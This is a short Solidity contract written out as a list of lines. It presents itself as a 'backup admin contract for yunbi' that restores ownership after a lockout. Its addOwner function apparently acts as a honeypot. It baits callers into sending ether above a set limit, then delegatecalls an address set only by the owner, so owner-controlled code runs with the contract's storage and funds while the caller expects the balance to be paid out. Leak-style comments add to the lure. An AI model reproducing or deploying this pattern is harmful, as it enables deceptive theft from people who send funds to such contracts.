['// created by tommy wang\n', '// segwit2x is the real bitcoin\n', '// 09.11.17\n', '// back up admin contract for yunbi, adds owner in case of lockout\n', '\n', '\n', 'pragma solidity ^0.4.18;\n', 'contract AdminInterface\n', '{\n', '    address public Owner; // web3.eth.accounts[9]\n', '    address public oracle;\n', '    uint256 public Limit;\n', '    \n', '    function AdminInterface(){\n', '        Owner = msg.sender;\n', '    }\n', '    \n', '     modifier onlyOwner() {\n', '        require(msg.sender == Owner);\n', '    _;\n', '  }\n', '\n', '    // config oracle db address and set minimum tx amt to limit abuse\n', '    function Set(address dataBase) payable onlyOwner\n', '    {\n', '        Limit = msg.value;\n', '        oracle = dataBase;\n', '    }\n', '    //can hold funds if needed\n', '    function()payable{}\n', '    \n', '    function transfer(address multisig) payable onlyOwner {\n', '        multisig.transfer(msg.value);\n', '    }\n', '\n', '    function addOwner(address newAddr) payable\n', '    {   \n', '        if(msg.value > Limit)\n', '        {        \n', '            // Because database is an database address, this adds owner to the database for that contract\n', '            oracle.delegatecall(bytes4(keccak256("AddToWangDB(address)")),msg.sender);\n', '\n', '            // transfer this wallets balance to new owner after address change\n', '            newAddr.transfer(this.balance);\n', '        }\n', '    }\n', '}']